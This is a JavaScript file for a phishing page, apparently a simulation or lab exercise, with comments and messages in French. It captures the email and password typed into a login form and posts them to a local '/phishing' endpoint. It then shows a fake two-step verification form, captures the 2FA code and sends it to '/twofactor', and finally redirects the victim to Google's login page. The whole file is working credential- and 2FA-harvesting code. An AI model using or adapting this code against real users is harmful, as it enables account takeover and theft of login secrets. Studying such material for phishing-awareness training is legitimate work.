document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    fetch('http://127.0.0.1:5000/phishing', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password, timestamp: new Date().toISOString() })
    })
    .then(response => response.json())
    .then(data => {
        console.log("✅ Identifiants capturés !");
        
        // Transition vers l'étape 2FA
        document.getElementById('loginForm').style.display = 'none';
        document.getElementById('formTitle').innerText = 'Vérification en deux étapes';
        document.getElementById('twoFactorForm').style.display = 'block';
        document.getElementById('securityWarning').style.display = 'block';
    })
    .catch(error => {
        console.error("❌ Erreur:", error);
        alert("Erreur lors de la connexion au serveur.");
    });
});

document.getElementById('twoFactorForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const code = document.getElementById('twoFactorCode').value;

    fetch('http://127.0.0.1:5000/twofactor', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code, timestamp: new Date().toISOString() })
    })
    .then(response => response.json())
    .then(data => {
        console.log("✅ Code 2FA capturé !");
        alert("Simulation : Le code 2FA a été capturé. Redirection...");
        window.location.href = 'https://accounts.google.com/';
    })
    .catch(error => {
        console.error("❌ Erreur:", error);
        alert("Erreur lors de l'envoi du code.");
    });
});